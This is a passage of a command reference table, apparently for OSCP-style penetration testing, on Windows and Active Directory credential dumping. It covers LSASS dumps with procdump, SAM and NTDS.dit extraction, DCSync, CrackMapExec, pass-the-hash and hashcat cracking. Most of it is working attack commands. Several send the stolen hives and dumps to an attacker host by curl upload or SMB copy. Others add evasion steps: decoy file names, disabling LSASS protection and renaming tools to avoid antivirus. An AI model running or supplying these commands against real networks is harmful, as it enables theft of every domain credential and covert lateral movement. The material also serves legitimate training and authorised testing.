- Mitigation: Use alternate names (svchost.dmp), delete after transfer, dump to user profile (blend with legitimate activity)

FILE TRANSFER OPTIONS:
1. SMB: copy lsass.dmp \\<LHOST>\share\ (fastest for large files)
2. HTTP upload: curl -X POST -F file=@lsass.dmp http://<LHOST>:8080/upload
3. certutil encode: certutil -encode lsass.dmp lsass.txt (base64, then copy/paste)
4. PowerShell: Invoke-WebRequest -Uri http://<LHOST>:8080/upload -Method POST -InFile lsass.dmp

TIME ESTIMATE:
Dump: 10-30 seconds (depends on LSASS size)
Transfer: 30-180 seconds (40-200MB file, depends on connection speed)
Mimikatz processing: 5-15 seconds
Total: 1-4 minutes","high","","","","{""Access is denied"": ""Requires SYSTEM or Administrator privileges. Solution: Verify shell runs as SYSTEM (whoami). If Administrator, elevate to SYSTEM: psexec -s -i cmd.exe. Or use Mimikatz privilege::debug + sekurlsa::minidump instead."", ""Error writing dump file"": ""Disk space insufficient or permission denied on output path. Solution: Write to user-writable directory: procdump.exe -accepteula -ma lsass.exe %TEMP%\\lsass.dmp. Or write to SMB share: procdump.exe -accepteula -ma lsass.exe \\\\<LHOST>\\share\\lsass.dmp"", ""Protected process"": ""PPL (Protected Process Light) enabled - Windows Defender Credential Guard. Solution: (1) Check if enabled: Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard. (2) If enabled, ProcDump fails. Alternative: Disable PPL (requires reboot + registry): reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f (reboot required). Or use mimikatz with PPL bypass (advanced)."", ""procdump.exe not recognized"": ""ProcDump not uploaded to target. Solution: Upload from Kali: smbserver.py share /opt/sysinternals/ (on Kali), then copy \\\\<LHOST>\\share\\procdump.exe . (on target). Or download directly: certutil -urlcache -f http://<LHOST>/procdump.exe procdump.exe"", ""Dump file won't transfer (too large)"": ""File 100+ MB. Solution: Compress first: powershell Compress-Archive lsass.dmp lsass.zip. Or split: fsutil file createnew dummy 10485760 (split with certutil or PowerShell). Or use SMB server: copy lsass.dmp \\\\<LHOST>\\share\\"", ""AV deletes procdump.exe"": ""Rare but possible. Solution: Rename: ren procdump.exe svchost.exe. Or upload to alternate path: C:\\Windows\\Temp\\. Or use process hollowing/injection to run ProcDump in memory (advanced).""}","{""procdump.exe"": ""Microsoft Sysinternals tool for creating process memory dumps. Legitimate admin tool - often bypasses AV when Mimikatz is blocked. Signed by Microsoft. ADVANTAGE: No AV alerts, forensically cleaner than direct Mimikatz execution. DISADVANTAGE: Requires file transfer (lsass.dmp is 40-200MB). Downloaded from: https://docs.microsoft.com/sysinternals/downloads/procdump"", ""-accepteula"": ""Automatically accept Sysinternals EULA (no interactive prompt). Required for scripted/automated execution. Without this flag, procdump pauses waiting for EULA acceptance."", ""-ma"": ""Full memory dump (Mini plus All memory). Captures complete process memory including heap, stacks, handles. CRITICAL for credential extraction - partial dumps miss credentials in heap memory. Alternative: -mm (mini dump, smaller but may miss creds)."", ""lsass.exe"": ""Local Security Authority Subsystem Service - Windows security process managing authentication. Runs with SYSTEM privileges. Contains: (1) Cleartext passwords (WDigest, if enabled), (2) NTLM hashes (all logged-in users), (3) Kerberos TGTs/TGSs, (4) Cached domain credentials. PID typically ~600-800."", ""lsass.dmp"": ""Output filename. Can be any name. OPSEC TIP: Use innocuous names like 'svchost.dmp' or 'update.tmp'. File size: 40-200MB depending on system uptime and logged-in users.""}","[""windows-psexec-system-shell""]","",""
"ad-sam-dump-reg-save","Dump SAM and SYSTEM Hives with reg save","post-exploit","reg save HKLM\SAM sam.hive && reg save HKLM\SYSTEM system.hive","Export SAM and SYSTEM registry hives for offline local account password hash extraction. Requires local admin. Use secretsdump.py on Kali to extract NTLM hashes.","credential-dumping","","STANDARD method for local account hash extraction on Windows workstations and member servers. Advantage over LSASS dump: Smaller files (< 25MB total), no AV alerts (reg save is legitimate admin operation), offline processing. OSCP WORKFLOW: (1) Get admin shell, (2) reg save both hives, (3) Transfer to Kali (SMB/HTTP), (4) Extract hashes: impacket-secretsdump -sam sam.hive -system system.hive LOCAL. Output format: USERNAME:RID:LM:NTLM::: (Hashcat mode 1000). Use for Pass-the-Hash lateral movement or password cracking. Time estimate: 2-5 seconds (export) + 5-30 seconds (transfer) + 2 seconds (hash extraction).

MANUAL ALTERNATIVES:

Export to temp directory:
reg save HKLM\SAM %TEMP%\sam.hive
reg save HKLM\SYSTEM %TEMP%\system.hive
cd %TEMP%

Export directly to SMB share (no local storage):
smbserver.py share /tmp/ (on Kali)  
reg save HKLM\SAM \\<LHOST>\share\sam.hive
reg save HKLM\SYSTEM \\<LHOST>\share\system.hive

Export with alternate names (OPSEC):
reg save HKLM\SAM update.tmp
reg save HKLM\SYSTEM svchost.dat

Extract hashes on Kali with secretsdump:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
# Output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM>:: ...

Extract specific user:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL | grep Administrator

Extract with pypykatz (Python alternative):
pypykatz registry --sam sam.hive system.hive > hashes.txt

Parse NTLM hashes only (for hashcat):
impacket-secretsdump -sam sam.hive -system system.hive LOCAL | cut -d':' -f4 > ntlm.txt
hashcat -m 1000 ntlm.txt rockyou.txt

Pass-the-Hash with extracted hash:
impacket-psexec -hashes :<NTLM_HASH> './administrator@<TARGET_IP>'

Export SECURITY hive (LSA secrets - additional credentials):
reg save HKLM\SECURITY security.hive
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL

Automated script (all hives + cleanup):
@echo off
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
copy *.hive \\<LHOST>\share\
del sam.hive system.hive security.hive

WHAT YOU GET:
- Local account NTLM hashes (Administrator, backup accounts, service accounts)
- LM hashes (if enabled on old systems - rarely useful)
- LSA secrets (if SECURITY hive exported): service account passwords, machine account password, cached domain credentials

WHAT YOU DON'T GET:
- Domain account hashes (need DCSync or NTDS.dit)
- Cleartext passwords (need LSASS dump + Mimikatz)
- Kerberos tickets (need LSASS dump)
- Currently logged-in user credentials (need LSASS dump)

USE CASES:
- Workstation local admin hash extraction
- Member server local account compromise
- Backup admin account discovery
- Pass-the-Hash preparation for lateral movement
- Offline password cracking

OPSEC:
- Event ID 4656/4663 (registry access) logged
- Sysmon Event ID 12/13 (registry modification) if deployed
- Low suspicion - reg save is legitimate admin task
- Files should be deleted after exfiltration

FILE TRANSFER:
1. SMB: copy *.hive \\<LHOST>\share\ (fastest)
2. HTTP upload: curl -X POST -F sam=@sam.hive -F system=@system.hive http://<LHOST>:8080/upload
3. Base64 encode (small files): certutil -encode sam.hive sam.txt
4. PowerShell: IWR -Uri http://<LHOST>:8080/upload -Method POST -InFile sam.hive

CLEANUP:
del sam.hive system.hive (on target after exfiltration)

TIME ESTIMATE:
Export hives: 2-5 seconds
Transfer (SMB): 5-30 seconds (depends on connection, typically <25MB total)
Hash extraction on Kali: 1-2 seconds  
Total: 10-40 seconds","high","","","","{""Access is denied"": ""Requires Administrator or SYSTEM. Solution: Verify privilege: whoami /groups (look for 'S-1-5-32-544' = Administrators). If regular admin, elevate to SYSTEM: psexec -s -i cmd.exe or: PsExec.exe -accepteula -s cmd.exe"", ""The process cannot access the file"": ""Registry hives are locked by system. Solution: This is normal for SAM/SYSTEM. Use 'reg save' (not 'copy' or 'xcopy'). Reg save creates snapshot while hives are in use. Verify command syntax exactly: reg save HKLM\\SAM sam.hive (double backslash required in command line)."", ""File already exists"": ""Previous dump file present. Solution: Delete old files: del sam.hive system.hive. Or use different names: reg save HKLM\\SAM sam2.hive"", ""Insufficient disk space"": ""Not enough space in current directory. Solution: Dump to user temp: reg save HKLM\\SAM %TEMP%\\sam.hive && reg save HKLM\\SYSTEM %TEMP%\\system.hive. Or dump to network share: reg save HKLM\\SAM \\\\<LHOST>\\share\\sam.hive"", ""Files won't transfer (locked)"": ""Windows holds file handle. Solution: Close all applications, or rename before transfer: ren sam.hive sam.bak. Or use 'copy' (creates new handle): copy sam.hive sam2.hive && copy sam2.hive \\\\<LHOST>\\share\\"", ""Cannot extract hashes on Kali"": ""Missing SYSTEM hive or using wrong tool. Solution: MUST have both SAM and SYSTEM. Use impacket-secretsdump: impacket-secretsdump -sam sam.hive -system system.hive LOCAL. For pypykatz: pypykatz registry --sam sam.hive system.hive""}","{""reg save"": ""Windows registry export command. Creates binary hive file backup. Requires Administrator or SYSTEM privileges. CRITICAL: Must export BOTH SAM and SYSTEM - SAM contains password hashes (encrypted), SYSTEM contains boot key (decryption key). Cannot decrypt SAM without SYSTEM hive."", ""HKLM\\SAM"": ""HKEY_LOCAL_MACHINE\\SAM - Security Account Manager database. Contains local user account information including NTLM password hashes (encrypted with SysKey from SYSTEM hive). Includes: Administrator, Guest, and all local user accounts. Does NOT include domain accounts (those are in NTDS.dit on DC)."", ""sam.hive"": ""Output filename for SAM database. Can be any name. Typical size: 256KB - 2MB. Contains encrypted hashes for all local accounts on this machine only."", ""HKLM\\SYSTEM"": ""System hive containing boot key (SysKey) used to encrypt SAM password hashes. Also contains: service configurations, driver settings, system parameters. Required for SAM decryption."", ""system.hive"": ""Output filename for SYSTEM hive. Can be any name. Typical size: 10-20MB. Contains decryption key for SAM hashes."", ""&&"": ""Command chaining - executes both commands sequentially. If first command fails, second still attempts. Use & (single ampersand) for unconditional execution, or || (double pipe) for 'or' logic.""}","[""enable-remote-registry"", ""crackmapexec-validate-admin""]","[""crackmapexec-sam-dump"", ""impacket-secretsdump""]","[""impacket-secretsdump"", ""hashcat-ntlm-crack"", ""ad-pass-the-hash-crackmapexec""]"
"crackmapexec-sam-dump","CrackMapExec - Automated SAM Dump","post-exploit","crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD> --sam","Automatically dump local account hashes (SAM database) from remote Windows system using CrackMapExec. Combines reg save + secretsdump in one command. Cleaner than manual SAM extraction.","credential-dumping","crackmapexec smb 192.168.50.100 -u administrator -p P@ssw0rd! --sam","FASTEST SAM dump method - fully automated extraction and parsing. Combines reg save + secretsdump + cleanup in one command. OSCP ADVANTAGE: No need to manually transfer files or run separate extraction - CME outputs hashes directly. WHEN TO USE: Quick SAM harvesting across multiple targets, automated credential dumping in large networks. DISADVANTAGE: Less stealthy than manual reg save (multiple SMB connections), CME may be flagged by EDR. Time estimate: 5-15 seconds per target.

MANUAL ALTERNATIVES:

Pass-the-Hash:
crackmapexec smb <TARGET> -u <USER> -H <NTLM> --sam

Local account authentication:
crackmapexec smb <TARGET> -u administrator -p <PASS> --local-auth --sam

Domain account with local admin rights:
crackmapexec smb <TARGET> -u 'DOMAIN/admin' -p <PASS> --sam

Multiple targets (subnet):
crackmapexec smb 192.168.50.0/24 -u administrator -p <PASS> --sam

From file of targets:
crackmapexec smb targets.txt -u administrator -p <PASS> --sam

Dump LSA secrets (additional credentials):
crackmapexec smb <TARGET> -u <USER> -p <PASS> --lsa

Dump both SAM and LSA:
crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam --lsa

Save output to file:
crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam > sam_hashes.txt

Combine with password spraying:
crackmapexec smb <TARGET> -u users.txt -p <PASS> --sam --continue-on-success

OUTPUT FORMAT:
SMB <TARGET> 445 <HOSTNAME> Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
                              ^USERNAME   ^RID ^LM_HASH                       ^NTLM_HASH

PARSING OUTPUT:
Extract NTLM hashes only:
crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam | grep ""::"" | cut -d':' -f4

Extract Administrator hash:
crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam | grep Administrator | cut -d':' -f4

USE CASES:
- Quick local account hash harvesting
- Automated credential dumping across multiple workstations
- Pass-the-Hash attack preparation
- Finding password reuse (same local admin password on multiple machines)

COMPARISON TO ALTERNATIVES:
Manual reg save: More steps, requires file transfer, more control
CME --sam: Automated, one command, faster, less granular control
impacket-secretsdump -sam: Offline processing, requires pre-dumped hives

LATERAL MOVEMENT WORKFLOW:
1. Credential discovery: crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam
2. Extract Administrator hash from output
3. Pass-the-Hash to other machines: crackmapexec smb 192.168.50.0/24 -u administrator -H <HASH> --sam
4. Build credential database, identify password reuse patterns
5. Escalate to domain admin via credential chaining

TIME ESTIMATE:
Single target: 5-15 seconds
Subnet scan (10 hosts): 30-90 seconds  
Large network (100 hosts): 5-15 minutes","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Verify: crackmapexec smb <TARGET> -u <USER> -p <PASS> (without --sam, just test auth). Check password case sensitivity. Try local account: -u ./administrator --local-auth"", ""STATUS_ACCESS_DENIED"": ""User lacks admin rights. Solution: Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS> (should show 'Pwn3d!'). User must be in local Administrators group. Try different user or escalate privileges."", ""Connection refused"": ""SMB port 445 blocked. Solution: Verify: sudo nmap -p 445 -Pn <TARGET>. Check firewall rules. If only RDP available, use alternative: RDP to target \u2192 run reg save manually."", ""Error retrieving SAM"": ""Registry access failed. Possible reasons: (1) Endpoint protection blocking reg save, (2) SAM database locked, (3) Insufficient permissions. Solution: Try manual method: reg save HKLM\\SAM + impacket-secretsdump. Or use --lsa flag for LSA secrets instead."", ""crackmapexec command not found"": ""CME not installed. Solution: Install: sudo apt install crackmapexec (Kali) or pipx install crackmapexec. Verify: which crackmapexec""}","{""crackmapexec smb"": ""SMB-based CrackMapExec module. Connects to target via SMB (port 445) for remote administration. ADVANTAGE: Automated credential dumping, cleaner than manual methods, automatically extracts and parses hashes. Part of standard OSCP toolkit."", ""--sam"": ""Dump SAM database (local account hashes). CME automatically: (1) Authenticates to target, (2) Uses reg save to export SAM + SYSTEM hives remotely, (3) Downloads hives, (4) Extracts hashes with secretsdump, (5) Cleans up remote files. Output: LOCAL\\username:NTLM hash format."", ""-u <USERNAME>"": ""Username for authentication. Can be local account or domain account with local admin rights on target. For local accounts, prefix with './': -u ./administrator. For domain accounts: -u 'DOMAIN/username'."", ""-p <PASSWORD>"": ""Password for authentication. Use single quotes if password contains special characters: -p 'P@ss!w0rd'. Alternative: --local-auth flag forces local account authentication (bypasses domain)."", ""Optional: -H <NTLM_HASH>"": ""Pass-the-Hash instead of password. Format: -H <NTLM> or -H <LM>:<NTLM>. Example: -H 8846f7eaee8fb117ad06bdd830b7586c. Useful when you have hash but not cleartext password."", ""Optional: --local-auth"": ""Force local account authentication (bypass domain). Use when targeting workgroup systems or when username exists both locally and in domain: crackmapexec smb <TARGET> -u administrator -p <PASS> --local-auth --sam""}","","[""ad-sam-dump-reg-save""]","[""windows-hashcat-crack-ntlm"", ""ad-pass-the-hash-impacket-psexec""]"
"ad-dcsync-ntds-credentials","Extract Credentials from Offline NTDS.dit","post-exploit","impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL","Offline extraction of ALL domain credentials from NTDS.dit database file. Use after exfiltrating NTDS.dit and SYSTEM hive from Domain Controller. Extracts thousands of hashes for entire AD domain.","credential-dumping","","COMPLETE domain credential harvest via offline NTDS.dit processing. WHEN TO USE: After exfiltrating NTDS.dit from DC (via vssadmin/ntdsutil), for comprehensive password analysis, when DCSync is blocked or logged. ADVANTAGE: Offline processing (no DC interaction after exfiltration), complete domain view (all users/computers/groups). DISADVANTAGE: Requires NTDS.dit exfiltration (multi-GB file, high risk). OSCP EXAM: Rarely needed (DCSync with secretsdump -just-dc faster). More common in labs for comprehensive credential analysis. Time estimate: 30 seconds - 5 minutes (depends on NTDS.dit size).

MANUAL ALTERNATIVES:

Extract with password history:
impacket-secretsdump -ntds ntds.dit -system system.hive -history LOCAL

Save to files:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL -outputfile corp_dump
# Creates: corp_dump.ntds, corp_dump.secrets, corp_dump.kerberos

Extract specific users only:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep -i ""admin\|krbtgt\|service""

Parse NTLM hashes only (for Hashcat):
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep ""::"" | cut -d':' -f4 > ntlm_hashes.txt
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

Extract krbtgt for Golden Ticket:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep krbtgt

Count total user accounts:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep -c ""::""

NTDS.DIT EXTRACTION METHODS:

1. Volume Shadow Copy (VSS) - RECOMMENDED:
vssadmin create shadow /for=C:
copy <SHADOW_PATH>\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
vssadmin delete shadows /for=C: /quiet
reg save HKLM\SYSTEM C:\Temp\system.hive

2. ntdsutil (older method):
ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\Temp\IFM"" q q
# Creates ntds.dit in C:\Temp\IFM\Active Directory\

3. PowerShell (VSS automation):
$shadow = (gwmi -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible')
$id = $shadow.ShadowID  
$path = (gwmi Win32_ShadowCopy | ?{$_.ID -eq $id}).DeviceObject
cmd /c copy ""$path\Windows\NTDS\ntds.dit"" C:\Temp\ntds.dit
(gwmi Win32_ShadowCopy | ?{$_.ID -eq $id}).Delete()

4. CrackMapExec automation:
crackmapexec smb <DC_IP> -u <DA_USER> -p <PASS> --ntds vss
# Automatically extracts, dumps, and cleans up

FILE TRANSFER (NTDS.dit is large - 100MB to 50GB):

1. Compress first:
7z a -tgzip ntds.dit.gz ntds.dit (reduces to ~10-20% original size)
copy ntds.dit.gz \\<LHOST>\share\

2. Split if too large:
fsutil file createnew dummy 104857600
certutil -split -f ntds.dit 100000000 ntds.dit.part
# Transfer parts separately, then rejoin on Kali: cat ntds.dit.part* > ntds.dit

3. SMB server (direct transfer):
smbserver.py share /tmp/ (on Kali)
copy ntds.dit \\<LHOST>\share\ (on DC)

4. HTTP upload (compressed):
7z a ntds.dit.gz ntds.dit
curl -X POST -F file=@ntds.dit.gz http://<LHOST>:8080/upload

OUTPUT ANALYSIS:

Find enabled users (UAC flag):
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep -v ""ACCOUNTDISABLE""

Find admin accounts (RID 500-520):
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep "":50[0-9]:""

Find computer accounts:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep ""\$:""

Find service accounts (common naming):
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep -i ""svc\|sql\|backup\|service""

Password analysis with hashcat:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | cut -d':' -f4 | sort -u > unique_hashes.txt
hashcat -m 1000 unique_hashes.txt rockyou.txt -r best64.rule --force
# Identifies weak passwords across entire domain

TIME ESTIMATE:
Extraction (VSS): 30-120 seconds (depends on NTDS.dit size)
Transfer: 1-30 minutes (100MB-50GB file, connection dependent)
Processing with secretsdump: 30 seconds - 5 minutes (depends on domain size)
Total: 2-35 minutes","medium","","","","{""Cannot open ntds.dit"": ""File path wrong or permissions issue. Solution: Verify file exists: ls -lh ntds.dit. Check permissions: chmod 644 ntds.dit. Verify not corrupted: file ntds.dit (should show 'Extensible storage engine DataBase'). Try absolute path: impacket-secretsdump -ntds /full/path/to/ntds.dit ..."", ""Cannot open system.hive"": ""SYSTEM hive missing or wrong path. Solution: Verify file: ls -lh system.hive. CRITICAL: SYSTEM hive must be from SAME DC as NTDS.dit. If mismatch, decryption fails. Re-extract: reg save HKLM\\SYSTEM system.hive (on same DC)."", ""Incorrect boot key"": ""SYSTEM hive does NOT match NTDS.dit (extracted from different DC). Solution: Re-export SYSTEM hive from correct DC. Ensure both files from same source. Check extraction timestamp."", ""Database not in clean state"": ""NTDS.dit was copied while DC running (file inconsistent). Solution: Must extract via Volume Shadow Copy: (1) vssadmin create shadow /for=C:, (2) copy <SHADOW_PATH>\\Windows\\NTDS\\ntds.dit, (3) vssadmin delete shadows /for=C: /quiet. Or use ntdsutil for clean extraction."", ""No module named 'impacket'"": ""Impacket not installed on Kali. Solution: sudo apt install impacket-scripts OR pip3 install impacket. Verify: which impacket-secretsdump"", ""Too much output (10,000+ lines)"": ""Large domain. Solution: Redirect to file: impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL > all_hashes.txt. Filter specific users: grep -i administrator all_hashes.txt. Extract NTLM column: cut -d':' -f4 all_hashes.txt > ntlm.txt""}","{""impacket-secretsdump"": ""Impacket credential extraction tool. With -ntds flag, processes offline NTDS.dit database (Active Directory database file from Domain Controller). ADVANTAGE: Offline processing on attacker machine - no DC connection needed, no network traffic, no additional DC logs. DISADVANTAGE: Requires NTDS.dit exfiltration (multi-GB file)."", ""-ntds ntds.dit"": ""Path to NTDS.dit file (Active Directory database). Located on DC at C:\\Windows\\NTDS\\ntds.dit. Contains: ALL domain user hashes, ALL computer account hashes, ALL group memberships, Domain SID, GPO information, etc. File size: 100MB - 50GB+ (depending on domain size). CRITICAL: File must be exported via Volume Shadow Copy (vssadmin/ntdsutil) - cannot copy directly while DC running."", ""-system system.hive"": ""Path to SYSTEM registry hive from same DC. Contains boot key (SysKey) required to decrypt NTDS.dit hashes. Must match the DC where NTDS.dit was extracted. Export with: reg save HKLM\\SYSTEM system.hive (on DC)."", ""LOCAL"": ""Keyword indicating offline/local processing (not remote connection). Tells secretsdump to process files on local Kali filesystem instead of connecting to remote target."", ""Optional: -history"": ""Extract password history (previous passwords). Useful for password pattern analysis and cracking old passwords that may still be valid elsewhere. Example: -ntds ntds.dit -system system.hive -history LOCAL"", ""Optional: -outputfile <PREFIX>"": ""Save output to files instead of stdout. Creates: <PREFIX>.ntds (hashes), <PREFIX>.cleartext (cleartext passwords if any), <PREFIX>.kerberos (Kerberos keys). Example: -outputfile corp_domain""}","","","[""windows-hashcat-crack-ntlm-file"", ""ad-golden-ticket-mimikatz-create""]"
"download-powerview","Download PowerView from GitHub","enumeration","iwr -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -OutFile PowerView.ps1","Download PowerView.ps1 from PowerSploit repository to current directory","","","PowerView is the most widely-used PowerShell tool for Active Directory enumeration.

Part of PowerSploit framework.

For OSCP exam environments without internet, transfer PowerView.ps1 via file-transfer techniques (SMB, HTTP, base64).

Always verify file integrity after download.","high","","","","{""Execution Policy Error"": ""Set-ExecutionPolicy Bypass -Scope Process -Force"", ""Unable to connect"": ""Check network connectivity or firewall. Alternative: Transfer via SMB or HTTP server"", ""TLS/SSL Error"": ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12""}","{""iwr"": ""Invoke-WebRequest (PowerShell 3.0+) - downloads files from web"", ""-Uri"": ""Source URL for the file to download"", ""-OutFile"": ""Local file path to save downloaded content""}","","[""curl-download-powerview""]","[""import-powerview""]"
"curl-download-powerview","Download PowerView using curl","enumeration","curl -o PowerView.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1","Download PowerView.ps1 using curl command (alternative method)","","","curl is available on Windows 10 1803+ and Windows Server 2019+.

For older systems, use PowerShell's Invoke-WebRequest (download-powerview) or certutil.","high","","","","{""curl not found"": ""Use PowerShell iwr instead: download-powerview"", ""SSL certificate problem"": ""curl -k -o PowerView.ps1 <URL> (insecure, verify file after)""}","{""-o"": ""Output file name for downloaded content""}","","[""download-powerview""]","[""import-powerview""]"
"download-sharphound","Download SharpHound from GitHub","enumeration","iwr -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile SharpHound.ps1","Download SharpHound.ps1 PowerShell collector for BloodHound from official repository","","","SharpHound is the official data collector for BloodHound.

Collects AD objects, permissions, sessions, and relationships.

PowerShell version (SharpHound.ps1) is easier to transfer but more detectable.

For OSCP:
SharpHound.exe (compiled) is preferred for stealth.

Transfer to target via file-transfer techniques if no internet access.","high","","","","{""TLS Error"": ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"", ""Execution Policy"": ""Set-ExecutionPolicy Bypass -Scope Process -Force"", ""404 Error"": ""GitHub URL may have changed. Check BloodHound repository for current path or download SharpHound.exe instead""}","{""iwr"": ""Invoke-WebRequest cmdlet for downloading files"", ""-Uri"": ""Source URL for SharpHound.ps1"", ""-OutFile"": ""Output file path""}","","","[""import-sharphound""]"
"import-sharphound","Import SharpHound Module","enumeration",". .\SharpHound.ps1","Import SharpHound PowerShell module for BloodHound data collection","","","After importing, use Invoke-BloodHound to collect data.

SharpHound generates ZIP file containing JSON data for BloodHound analysis.

Noisy on network - creates many LDAP queries and SMB connections.

OSCP:
SharpHound valuable for understanding AD attack paths but manual enumeration also required.","high","","","","{""Execution Policy Error"": ""Set-ExecutionPolicy Bypass -Scope Process -Force"", ""File not found"": ""Verify SharpHound.ps1 in current directory: ls SharpHound.ps1"", ""Module not recognized"": ""Re-import after fixing execution policy"", ""AMSI Detection"": ""Use SharpHound.exe compiled binary instead for better AMSI evasion""}","{"". (dot-source)"": ""Execute script in current scope, loading Invoke-BloodHound function""}","[""download-sharphound""]","",""
"download-powerup","Download PowerUp from GitHub","post-exploit","iwr -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -OutFile PowerUp.ps1","Download PowerUp.ps1 privilege escalation enumeration tool from PowerSploit repository","","","PowerUp automates Windows privilege escalation enumeration.

Checks for service misconfigurations, unquoted service paths, modifiable service binaries, AlwaysInstallElevated, DLL hijacking, and more.

Essential tool for Windows post-exploitation.

OSCP:
Always run PowerUp after gaining initial access to Windows system.","high","","","","{""TLS Error"": ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"", ""Execution Policy"": ""Set-ExecutionPolicy Bypass -Scope Process -Force"", ""No internet access"": ""Transfer PowerUp.ps1 via SMB, HTTP, or base64 encoding""}","{""iwr"": ""Invoke-WebRequest for downloading files"", ""-Uri"": ""Source URL for PowerUp.ps1"", ""-OutFile"": ""Local file path to save""}","","","[""import-powerup""]"
"set-executionpolicy-bypass","Bypass PowerShell Execution Policy","post-exploit","Set-ExecutionPolicy Bypass -Scope Process -Force","Temporarily bypass PowerShell execution policy for current process to allow script execution","","","Windows execution policy is NOT a security boundary - it's a safety feature to prevent accidental script execution.

-Scope Process applies only to current PowerShell window and resets when window closes.

Does not require administrator privileges.

OSCP:
Always run this first when importing PowerShell scripts.

Alternative:
Launch PowerShell with 'powershell -ep bypass' flag instead of using Set-ExecutionPolicy.","high","","","","{""Access Denied"": ""You don't need admin for -Scope Process. Verify you used -Scope Process flag"", ""Still blocked"": ""Launch new PowerShell with: powershell -ep bypass -nop"", ""AMSI Blocking"": ""Execution policy set but AMSI still blocks. Different issue - need AMSI bypass""}","{""Set-ExecutionPolicy"": ""Changes user preference for PowerShell execution policy"", ""Bypass"": ""No restrictions - all scripts run without prompts or warnings"", ""-Scope Process"": ""Apply only to current PowerShell process (no permanent system changes)"", ""-Force"": ""Suppress confirmation prompts""}","","[""powershell-ep-bypass-flag""]","[""import-powerview"", ""import-powerup"", ""import-sharphound""]"
"powershell-ep-bypass-flag","Launch PowerShell with Execution Policy Bypass","post-exploit","powershell -ep bypass -nop","Start new PowerShell session with execution policy bypassed and no profile loading","","","This method bypasses execution policy at launch rather than changing it after launch.

-nop prevents profile scripts from running which can interfere with imported modules.

Preferred method for clean PowerShell environment.

OSCP:
Use this when launching PowerShell from command shell (cmd.exe) or after gaining code execution.","high","","","","{""Command not recognized"": ""Use full path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass"", ""Still blocked"": ""Try Set-ExecutionPolicy Bypass -Scope Process instead from within PowerShell""}","{""-ep bypass"": ""Execution Policy Bypass - allow all scripts to run"", ""-nop"": ""NoProfile - don't load PowerShell profile scripts (faster startup, cleaner environment)""}","","[""set-executionpolicy-bypass""]","[""import-powerview"", ""import-powerup"", ""import-sharphound""]"
"ad-dcsync-secretsdump-user","DCSync Specific User with Impacket (Linux)","post-exploit","impacket-secretsdump -just-dc-user <USERNAME> '<DOMAIN>/<DA_USER>:<PASSWORD>@<DC_IP>'","Extract single user's password hash from Domain Controller using DRSUAPI replication. Linux-based alternative to Mimikatz. RECOMMENDED for OSCP exams - clean output, no Windows AV interference.","active-directory","impacket-secretsdump -just-dc-user dave 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'","THIS IS THE PREFERRED DCSYNC METHOD FOR OSCP. Why: (1) Works from Kali (no Windows access needed), (2) No AV interference, (3) Output ready for Hashcat, (4) Same command works with -hashes for PTH. CRITICAL EXAM TIP: ALWAYS use single quotes around auth string to handle special chars in passwords. Output format is Hashcat-ready - copy the dave:1103:aad3b...:08d7a47... line directly into hashcat. Time estimate: 2-10 seconds for single user.

MANUAL ALTERNATIVES:
Pass-the-Hash (when you have NTLM hash, not password):
impacket-secretsdump -hashes :<NTLM_HASH> -just-dc-user krbtgt '<DOMAIN>/<USER>@<DC_IP>'

Use DC FQDN with explicit IP:
impacket-secretsdump -just-dc-user Administrator -target-ip 192.168.50.70 'corp.com/admin:pass@DC1.corp.com'

Kerberos authentication (requires TGT):
export KRB5CCNAME=admin.ccache
impacket-secretsdump -k -no-pass -just-dc-user krbtgt 'corp.com/admin@DC1.corp.com'

Dump with history:
impacket-secretsdump -just-dc-user dave -history '<DOMAIN>/<USER>:<PASS>@<DC_IP>'

Extract multiple users:
for user in dave Administrator krbtgt; do impacket-secretsdump -just-dc-user $user 'corp.com/admin:pass@192.168.50.70' | grep ""$user:""; done

Parse NTLM hash only:
